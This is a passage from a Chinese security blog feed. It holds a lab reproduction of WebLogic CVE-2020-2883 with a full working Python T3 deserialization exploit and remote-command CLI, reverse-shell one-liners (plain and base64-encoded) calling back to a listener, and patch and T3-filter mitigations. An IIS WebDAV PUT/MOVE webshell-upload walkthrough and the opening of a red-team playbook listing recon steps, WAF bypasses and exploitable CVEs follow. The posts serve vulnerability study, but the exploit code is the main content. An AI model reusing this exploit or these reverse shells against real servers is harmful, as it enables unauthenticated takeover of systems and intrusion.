class="string">'aced0005737200176a6176612e7574696c2e5072696f72697479517565756594da30b4fb3f82b103000249000473697a654c000a636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b78700000000273720030636f6d2e74616e676f736f6c2e7574696c2e636f6d70617261746f722e457874726163746f72436f6d70617261746f72c7ad6d3a676f3c180200014c000b6d5f657874726163746f727400224c636f6d2f74616e676f736f6c2f7574696c2f56616c7565457874726163746f723b78707372002c636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e436861696e6564457874726163746f72889f81b0945d5b7f02000078720036636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374436f6d706f73697465457874726163746f72086b3d8c05690f440200015b000c6d5f61457874726163746f727400235b4c636f6d2f74616e676f736f6c2f7574696c2f56616c7565457874726163746f723b7872002d636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374457874726163746f72658195303e7238210200014900096d5f6e546172676574787000000000757200235b4c636f6d2e74616e676f736f6c2e7574696c2e56616c7565457874726163746f723b2246204735c4a0fe0200007870000000037372002f636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e5265666c656374696f6e457874726163746f72ee7ae995c02fb4a20200025b00096d5f616f506172616d7400135b4c6a6176612f6c616e672f4f626a6563743b4c00096d5f734d6574686f647400124c6a6176612f6c616e672f537472696e673b7871007e000900000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647371007e000d000000007571007e001100000002707571007e001100000000740006696e766f6b657371007e000d000000007571007e00110000000174'</span></span><br><span class="line">    payload_lenhex = <span class="string">'&#123;:04x&#125;'</span>.format(len(cmd))</span><br><span class="line">    payload_cmdhex = binascii.b2a_hex(cmd)</span><br><span class="line">    payload_end = <span class="string">'74000465786563770400000003767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707400013178'</span></span><br><span class="line">    payload = payload_start + payload_lenhex + payload_cmdhex + payload_end</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payloadtest</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line"></span><br><span class="line">        self.vuln = <span class="string">'cve_2020_2883'</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">t3handshake</span><span class="params">(self,sock,server_addr)</span>:</span></span><br><span class="line">        sock.connect(server_addr)</span><br><span class="line">        sock.send(<span class="string">'74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'</span>.decode(<span class="string">'hex'</span>))</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="comment">#print data</span></span><br><span class="line">        <span class="comment">#print 'handshake successful'</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">buildT3RequestObject</span><span class="params">(self,sock,port)</span>:</span></span><br><span class="line">        data1 = <span class="string">'000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371'</span></span><br><span class="line">        data2 = <span class="string">'007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd60000000700001b19ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07'</span></span><br><span class="line">        data3 = <span class="string">'1a7727000d3234322e323134'</span></span><br><span class="line">        data4 = <span class="string">'2e312e32353461863d1d0000000078'</span></span><br><span class="line">        <span class="keyword">for</span> d <span class="keyword">in</span> [data1,data2,data3,data4]:</span><br><span class="line">            sock.send(d.decode(<span class="string">'hex'</span>))</span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">        <span class="comment">#print 'send request payload successful,recv length:%d'%(len(sock.recv(2048)))</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sendEvilObjData</span><span class="params">(self,sock,data)</span>:</span></span><br><span class="line">        payload=<span class="string">'056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000'</span></span><br><span class="line">        payload+=data</span><br><span class="line">        payload+=<span class="string">'fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff'</span></span><br><span class="line">        payload = <span class="string">'%s%s'</span>%(<span class="string">'&#123;:08x&#125;'</span>.format(len(payload)/<span class="number">2</span> + <span class="number">4</span>),payload)</span><br><span class="line">        sock.send(payload.decode(<span class="string">'hex'</span>))</span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">        sock.send(payload.decode(<span class="string">'hex'</span>))</span><br><span class="line">        res = <span class="string">''</span></span><br><span class="line">        n=<span class="number">1</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                n += <span class="number">1</span></span><br><span class="line">                res += sock.recv(<span class="number">4096</span>)</span><br><span class="line">                time.sleep(<span class="number">0.1</span>)</span><br><span class="line">                <span class="keyword">if</span>(n&gt;<span class="number">15</span>):</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(self, url, cmd,timeout, proxies=globalProxies, **args)</span>:</span></span><br><span class="line">        (proto, ip, port, uri) = parseUrl(url)</span><br><span class="line"></span><br><span class="line">        server_addr = (ip, int(port))</span><br><span class="line">        <span class="keyword">if</span> proto == <span class="string">'https'</span>:</span><br><span class="line">            sock = ssl.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        sock.settimeout(timeout)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.t3handshake(sock,server_addr)</span><br><span class="line">            self.buildT3RequestObject(sock,port)</span><br><span class="line">            payload = CVE_2020_2883(cmd)</span><br><span class="line">            resp = self.sendEvilObjData(sock,payload)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">print</span> (<span class="string">'Payload send succeed! Please check.'</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">print</span> (<span class="string">'Failed! Exception:&#123;&#125;'</span>.format(str(e)))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(url,cmd)</span>:</span></span><br><span class="line">    x = payloadtest()</span><br><span class="line">    <span class="keyword">return</span> x.check(url, cmd,<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">'Weblogic cve-2020-2883 Exp'</span>,</span><br><span class="line">                                     usage=<span class="string">'use "python %(prog)s --help" for more information'</span>,</span><br><span class="line">                                     formatter_class=argparse.RawTextHelpFormatter)</span><br><span class="line">    parser.add_argument(<span class="string">"-u"</span>, <span class="string">"--url"</span>,</span><br><span class="line">                        dest=<span class="string">"url"</span>,</span><br><span class="line">                        help=<span class="string">"the url to check"</span></span><br><span class="line">                        )</span><br><span class="line"></span><br><span class="line">    parser.add_argument(<span class="string">"-c"</span>, <span class="string">"--cmd"</span>,</span><br><span class="line">                        dest=<span class="string">"cmd"</span>,</span><br><span class="line">                        help=<span class="string">"the cmd to run on the target"</span></span><br><span class="line">                        )</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> args.url <span class="keyword">or</span> <span class="keyword">not</span> args.cmd:</span><br><span class="line">        sys.exit(<span class="string">'Please assign url and cmd!'</span>)</span><br><span class="line">    poc(args.url, args.cmd)</span><br></pre></td></tr></table></figure><p>首先开启nc监听<code>nc -lvvp 19999</code></p><p>执行攻击脚本，反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python weblogic-2883.py -u http://188.40.189.135:18048/ -c <span class="string">"bash -i &gt;&amp; /dev/tcp/1.1.1.1/19999 0&gt;&amp;1"</span></span><br></pre></td></tr></table></figure><p><img src="/2020/08/23/weblogic-CVE-2020-2883/6.png" alt></p><p>返回shell成功执行，但是监听一直无法成功接收到shell，上网搜索了一下，反弹shell需要编码，通过网站</p><p><a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">http://www.jackson-t.ca/runtime-exec-payloads.html</a> 编码shell脚本，然后执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python weblogic-2883.py -u http://192.168.1.111:7001/ -c <span class="string">"bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMjM2Lz</span></span><br><span class="line"><span class="string">E5OTk5IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;"</span></span><br></pre></td></tr></table></figure><p><img src="/2020/08/23/weblogic-CVE-2020-2883/7.png" alt></p><p>如上图所示，成功反弹shell，访问/tmp/目录成功获取flag</p><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><h3 id="1、官方修复方案"><a href="#1、官方修复方案" class="headerlink" title="1、官方修复方案"></a>1、官方修复方案</h3><p>Oracle已经发布补丁修复了上述漏洞，请用户参考官方通告及时下载受影响产品更新补丁，并参照补丁安装包中的readme文件进行安装更新，以保证长期有效的防护。</p><p>   注：Oracle官方补丁需要用户持有正版软件的许可账号，使用该账号登陆<a href="https://support.oracle.com/" target="_blank" rel="noopener"><strong>https://support.oracle.com</strong></a>后，可以下载最新补丁。</p><h3 id="2、临时解决方案"><a href="#2、临时解决方案" class="headerlink" title="2、临时解决方案"></a>2、临时解决方案</h3><p>用户可通过控制T3协议的访问来临时阻断针对这些漏洞的攻击。操作方法如下：</p><pre><code>1. 进入WebLogic控制台，在base_domain的配置页面中，进入“安全”选项卡页面，点击“筛选器”，进入连接筛选器配置。2. 在连接筛选器中输入：weblogic.security.net.ConnectionFilterImpl，参考以下写法，在连接筛选器规则中配置符合企业实际情况的规则：</code></pre>   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 * * allow t3 t3s</span><br><span class="line">本机IP * * allow t3 t3s</span><br><span class="line">允许访问的IP  * * allow t3 t3s  </span><br><span class="line">* * * deny t3 t3s</span><br></pre></td></tr></table></figure><pre><code>3. 保存后若规则未生效，建议重新启动WebLogic服务（重启WebLogic服务会导致业务中断，建议相关人员评估风险后，再进行操作）。</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Vulfocus-复现weblogic-CVE-2020-2883漏洞&quot;&gt;&lt;a href=&quot;#Vulfocus-复现weblogic-CVE-2020-2883漏洞&quot; class=&quot;headerlink&quot; title=&quot;Vulfocus 复现weblogic_CVE-2020-2883漏洞&quot;&gt;&lt;/a&gt;Vulfocus 复现weblogic_CVE-2020-2883漏洞&lt;/h1&gt;&lt;h2 id=&quot;漏洞介绍&quot;&gt;&lt;a href=&quot;#漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;漏洞介绍&quot;&gt;&lt;/a&gt;漏洞介绍&lt;/h2&gt;&lt;p&gt;在Oracle官方发布的2020年4月关键补丁更新公告CPU（Critical Patch Update）中，两个针对 WebLogic Server ，CVSS 3.0评分为 9.8的严重漏洞（CVE-2020-2883、CVE-2020-2884），允许未经身份验证的攻击者通过T3协议网络访问并破坏易受攻击的WebLogic Server，成功的漏洞利用可导致WebLogic Server被攻击者接管，从而造成远程代码执行。&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="漏洞" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
      <category term="weblogic" scheme="http://yoursite.com/tags/weblogic/"/>
    
      <category term="CVE-2020-2883" scheme="http://yoursite.com/tags/CVE-2020-2883/"/>
    
      <category term="Vulfocus" scheme="http://yoursite.com/tags/Vulfocus/"/>
    
  </entry>
  
  <entry>
    <title>IIS PUT漏洞复现（MOVE方法 207 Multi-Status错误解决）</title>
    <link href="http://yoursite.com/2020/08/23/IIS-PUT/"/>
    <id>http://yoursite.com/2020/08/23/IIS-PUT/</id>
    <published>2020-08-23T08:37:14.036Z</published>
    <updated>2020-08-23T08:40:54.335Z</updated>
    
    <content type="html"><![CDATA[<h1 id="IIS-PUT漏洞复现（MOVE方法-207-Multi-Status错误解决）"><a href="#IIS-PUT漏洞复现（MOVE方法-207-Multi-Status错误解决）" class="headerlink" title="IIS PUT漏洞复现（MOVE方法 207 Multi-Status错误解决）"></a>IIS PUT漏洞复现（MOVE方法 207 Multi-Status错误解决）</h1><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>WebDAV（Web-based Distributed Authoring and Versioning） 是一种HTTP1.1的扩展协议。它扩展了HTTP 1.1，在GET、POST、HEAD等几个HTTP标准方法以外添加了一些新的方法，使应用程序可对Web Server直接读写，并支持写文件锁定(Locking)及解锁(Unlock)，还可以支持文件的版本控制。这样就可以像操作本地文件夹一样操作服务器上的文件夹。当然该扩展也存在缺陷，可以被恶意攻击者利用，直接上传恶意文件。</p><a id="more"></a><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>靶机环境：windows server2003 +IIS6 (192.168.1.99)</p><p>首先在靶机开启的IIS服务器，使用IISPutScanner工具扫描，发现put方法未被允许。</p><p><img src="/2020/08/23/IIS-PUT/1.png" alt></p><p>我们将web服务扩展中的webDAV打开</p><p><img src="/2020/08/23/IIS-PUT/2.png" alt></p><p>完成之后用工具先验证一下服务器当前是否允许PUT方法</p><p><img src="/2020/08/23/IIS-PUT/3.png" alt></p><p>可以看到PUT方法已经被允许了，然后我们需要复现input写入shell，所以我们在目标网站的属性中勾选“写入”权限。</p><p><img src="/2020/08/23/IIS-PUT/4.png" alt></p><p>添加写入权限之后，那么就用IIS写权限利用工具来进一步利用，先通过options方法探查一下服务器支持哪些http方法</p><p><img src="/2020/08/23/IIS-PUT/5.png" alt></p><p>可以看到是支持put方法的，下面我们选择PUT方法上传一个asp的shell（asp.asp），保存为test.asp</p><p><img src="/2020/08/23/IIS-PUT/6.png" alt></p><p>这里注意我们直接上传asp文件会提示失败，我们可以通过先上传txt文件的方式绕过</p><p><img src="/2020/08/23/IIS-PUT/7.png" alt></p><p>这里可以用MOVE方法将刚刚上传的txt文件修改为asp文件，从而将文本文件变成可执行的脚本文件。MOVE协议不会更改文件内容。</p><p><img src="/2020/08/23/IIS-PUT/8.png" alt></p><p>发现无法成功修改，我们可以利用IIS目录解析漏洞在文件后面加上;.txt或者;.jpg来绕过上传。（其实PUT方法也可以直接使用这种方式直接绕过上传，这里MOVE方法不知道为啥提示403错误）</p><p><img src="/2020/08/23/IIS-PUT/9.png" alt></p><p>我们看到shell文件成功写入，使用菜刀链接shell（<a href="http://192.168.1.99/shell.asp;.txt）" target="_blank" rel="noopener">http://192.168.1.99/shell.asp;.txt）</a> 成功。</p><p><img src="/2020/08/23/IIS-PUT/10.png" alt></p><p>MOVE方法没有成功各种不爽，然后查资料发现网站属性里面的主目录下除了要勾选“写入”选框之外还要勾选“脚本资源访问”</p><p><img src="/2020/08/23/IIS-PUT/11.png" alt></p><p>然后使用MOVE方法成功修改txt为shell文件aa.asp</p><p><img src="/2020/08/23/IIS-PUT/12.png" alt></p><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>通过整个漏洞复现过程我们也可以知道这个IIS PUT漏洞完全是因为管理员的一些不当配置导致的，所以想要修复只需要做到以下两点即可</p><ol><li><p>关闭WebDAV</p></li><li><p>关闭写入权限</p></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;IIS-PUT漏洞复现（MOVE方法-207-Multi-Status错误解决）&quot;&gt;&lt;a href=&quot;#IIS-PUT漏洞复现（MOVE方法-207-Multi-Status错误解决）&quot; class=&quot;headerlink&quot; title=&quot;IIS PUT漏洞复现（MOVE方法 207 Multi-Status错误解决）&quot;&gt;&lt;/a&gt;IIS PUT漏洞复现（MOVE方法 207 Multi-Status错误解决）&lt;/h1&gt;&lt;h2 id=&quot;漏洞介绍&quot;&gt;&lt;a href=&quot;#漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;漏洞介绍&quot;&gt;&lt;/a&gt;漏洞介绍&lt;/h2&gt;&lt;p&gt;WebDAV（Web-based Distributed Authoring and Versioning） 是一种HTTP1.1的扩展协议。它扩展了HTTP 1.1，在GET、POST、HEAD等几个HTTP标准方法以外添加了一些新的方法，使应用程序可对Web Server直接读写，并支持写文件锁定(Locking)及解锁(Unlock)，还可以支持文件的版本控制。这样就可以像操作本地文件夹一样操作服务器上的文件夹。当然该扩展也存在缺陷，可以被恶意攻击者利用，直接上传恶意文件。&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="漏洞" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
      <category term="IIS" scheme="http://yoursite.com/tags/IIS/"/>
    
      <category term="PUT" scheme="http://yoursite.com/tags/PUT/"/>
    
      <category term="MOVE" scheme="http://yoursite.com/tags/MOVE/"/>
    
  </entry>
  
  <entry>
    <title>HW弹药库之红队作战手册</title>
    <link href="http://yoursite.com/2020/07/11/HW-HD-DYK/"/>
    <id>http://yoursite.com/2020/07/11/HW-HD-DYK/</id>
    <published>2020-07-11T11:28:26.000Z</published>
    <updated>2020-07-11T11:44:55.376Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HW弹药库之红队作战手册"><a href="#HW弹药库之红队作战手册" class="headerlink" title="HW弹药库之红队作战手册"></a>HW弹药库之红队作战手册</h1><hr><p>本文来自klionsec的github</p><h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><blockquote><p>以下仅针对日常 “红队”场景,进行了一次相对全面完整的实战攻击利用技术提炼汇总，针对不同的渗透阶段,所可能会用到的一些技术都做了详尽梳理说明(后面可能还会整理出对应的完整工具链,虽然那不是最主要的),由于红队不同于一般的渗透测试,强调更多的是如何搞进去拿到相应机器权限或者实现某特定目的而不局限于你一定要在什么时间,用什么技术或者必须通过什么途径去搞<a id="more"></a>,相比传统渗透测试,红队则更趋于真实的入侵活动这种场景其实对防御者的实战对抗经验和技术深度都是比较大的挑战,所以以下的所有技术点也几乎都是完全站在这种场景和角度下来考量梳理的需要特别说明的是, 所有攻击手法在现实中都绝不是完全孤立使用的,往往很多手法都是相互灵活组合起来进行循环利用,由于绝大部分内容都是基于本人平时学习实战积累的一些经验,加之每个人的实际渗透思路都不同,所以肯定会有遗漏的地方,也欢迎弟兄们一起来积极指正补充完善,个人觉得,最好的防御永远不是怎么去防某个工具,是个明白人都知道,因为工具这些东西本身就是死的,稍微改下,定制下,现有的规则可能马上就防不住了,且一直会处于疲于应付的被动防御状态,尤其是针对红队这种特殊场景的,你的实际对手很可能都是有一定技术实力的人,所以针对每种核心的攻击技术技术展开做深入分析, 直接从源头上进行防御才是最靠谱的,虽然说短期这种成本代价相对较高, 但长期来看, 是一劳永逸的,沉淀下来的这些东西最终也会慢慢形成自己产品的核心竞争力和特色,说白点,这种对抗,本质上拼的还是双方的技术实力,不仅要能在不知觉的情况下搞进去,而且要能无限制加大对方后期的溯源成本另外,作为一名合格的攻防人员,工具的熟练掌握仅仅只是极小的一部分,对各种利用原理的深度理解和二次定制能力才是你的核心.</p></blockquote><h2 id="日常流程简要说明"><a href="#日常流程简要说明" class="headerlink" title="日常流程简要说明"></a>日常流程简要说明</h2><blockquote><p>入口权限 =&gt; 内网搜集/探测 =&gt; 免杀提权[非必须] =&gt; 抓取登录凭证 =&gt; 跨平台横向 =&gt; 入口维持 =&gt; 数据回传 =&gt; 定期权限维护</p></blockquote><h3 id="0x01-入口权限获取-前期侦察，搜集阶段本身就不存在太多可防御的点，非防御重心"><a href="#0x01-入口权限获取-前期侦察，搜集阶段本身就不存在太多可防御的点，非防御重心" class="headerlink" title="0x01 入口权限获取[前期侦察，搜集阶段本身就不存在太多可防御的点，非防御重心]"></a>0x01 入口权限获取[前期侦察，搜集阶段本身就不存在太多可防御的点，非防御重心]</h3><blockquote><ul><li>绕CDN找出目标所有真实ip段</li><li>找目标的各种Web管理后台登录口</li><li>批量抓取目标所有真实C段 Web banner</li><li>批量对目标所有真实C段进行基础服务端口扫描探测识别</li><li>尝试目标DNS是否允许区域传送,如果不允许则继续尝试子域爆破</li><li>批量抓取目标所有子域 Web banner</li><li>批量对目标所有子域集中进行基础服务端口探测识别</li><li>批量识别目标 所有存活Web站点的Web程序指纹 及其详细版本</li><li>从 Git 中查找目标泄露的各类敏感文件及账号密码,偶尔甚至还能碰到目标不小心泄露的各种云的 “AccessKey”</li><li>从网盘/百度文库中查找目标泄露的各类敏感文件及账号密码</li><li>从各第三方历史漏洞库中查找目标曾经泄露的各种敏感账号密码 [国内目标很好使]</li><li>目标Svn里泄露的各类敏感文件</li><li>网站目录扫描 [查找目标网站泄露的各类敏感文件, 网站备份文件,敏感配置文件, 源码 , 别人的webshell, 等等等…]</li><li>目标站点自身在前端代码中泄露的各种敏感信息</li><li>fofa / shodan / bing / google  hacking 深度利用</li><li>搜集目标学生学号 / 员工工号 / 目标邮箱 [并顺手到各个社工库中去批量查询这些邮箱曾经是否泄露过密码 ]</li><li>目标自己对外提供的各种 技术文档 / wiki里泄露的各种账号密码及其它敏感信息</li><li>目标微信小程序</li><li>分析目标app Web请求</li><li>借助js探针搜集目标内网信息</li><li>想办法混入目标的各种 内部QQ群 / 微信群</li><li>分析目标直接供应商 [尤其是技术外包]</li><li>根据前面已搜集到的各类信息制作有针对性的弱口令字典</li><li>目标所用 Waf 种类识别 与 绕过</li><li>BypassWAF 文件上传 / 读取 / 下载</li><li>BypassWAF Sql注入</li><li>BypassWAF RCE</li><li>BypassWAF 各类Java Web中间件已知Nday漏洞利用</li><li>BypassWAF Webshell 免杀</li></ul></blockquote><h3 id="0x02-入口权限获取-外部防御重心-“重中之重”"><a href="#0x02-入口权限获取-外部防御重心-“重中之重”" class="headerlink" title="0x02 入口权限获取[ 外部防御重心 ( “重中之重” ) ]"></a>0x02 入口权限获取[ 外部防御重心 ( “重中之重” ) ]</h3><blockquote><p>此阶段,主要是针对各主流 “中间件 + 开源程序 + Web服务组件” 自身的各种已知Nday漏洞利用如下已按 “实际攻击利用的难易程度” 及 “获取到的shell权限高低”为标准进行了详细排序,由于完全以实战利用为导向,故仅仅只挑选了一些相对会经常遇到的,且实战中确实能有效协助快速getshell 的 “中间件” , “开源程序” 及 “web组件”</p></blockquote><h4 id="针对各类Java中间件的各种已知Nday漏洞利用"><a href="#针对各类Java中间件的各种已知Nday漏洞利用" class="headerlink" title="针对各类Java中间件的各种已知Nday漏洞利用"></a>针对各类Java中间件的各种已知Nday漏洞利用</h4><p>不同于其它脚本类web程序,Java的运行权限通常都比较高,甚至大部分都是直接用root/administrator/system权限在跑,所以拿到的shell权限一般也非常高,通常都直接是服务器权限,尤其是在各种红队场景中,入侵者一般也都会首选这些点,并以此为突破口来获取一个稳定的跳板机入口权限,关于到底哪些行业特别爱用哪些中间件,这些也应该都是有事先分析梳理汇总好的</p><ul><li><p>Struts2</p><blockquote><p>Struts2-005<br>Struts2-008<br>Struts2-009<br>Struts2-013<br>Struts2-016(实际上,很多都老系统都漏补了这个洞,成功率较高)<br>Struts2-019<br>Struts2-020<br>Struts2-devmode<br>Struts2-032<br>Struts2-033<br>Struts2-037<br>Struts2-045<br>Struts2-046<br>Struts2-048<br>Struts2-052<br>Struts2-053<br>Struts2-057</p></blockquote></li><li><p>weblogic</p><blockquote><p>CVE-2019-2725<br>CVE-2019-2729<br>CVE-2018-3191<br>CVE-2018-2628<br>CVE-2018-2893<br>CVE-2018-2894<br>CVE-2017-3506<br>CVE-2017-10271<br>CVE-2017-3248<br>CVE-2016-0638<br>CVE-2016-3510<br>CVE-2015-4852<br>CVE-2014-4210<br>SSRF<br>控制台弱口令,部署webshell</p></blockquote></li><li><p>Jboss</p><blockquote><p>CVE-2015-7501<br>CVE-2017-7504<br>CVE-2017-12149<br>未授权访问,部署webshell<br>控制台弱口令,部署webshell</p></blockquote></li><li><p>wildfly [ jboss 7.x 改名为 wildfly ]</p><blockquote><p>控制台弱口令,部署webshell</p></blockquote></li><li><p>Tomcat</p><blockquote><p>CVE-2016-8735<br>CVE-2017-12615 [ readonly 实际设为 true的情况较少,稍鸡肋 ]<br>CVE-2020-1938 [ AJP协议漏洞,直接把8009端口暴露在外网的不太多,稍鸡肋 